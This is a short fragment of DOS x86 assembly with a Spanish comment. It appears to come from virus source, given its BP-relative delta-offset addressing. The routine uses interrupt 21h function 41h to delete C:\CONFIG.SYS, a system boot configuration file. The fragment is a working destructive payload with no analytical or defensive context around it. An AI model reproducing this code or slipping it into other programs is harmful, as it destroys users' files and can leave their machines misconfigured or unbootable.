

; Borra el archivo especificado en 'erasethis'

        mov     ah,41h
        mov dx,offset erasethis
        add dx,bp
        int     21h
        ret
erasethis db 'c:\config.sys',0

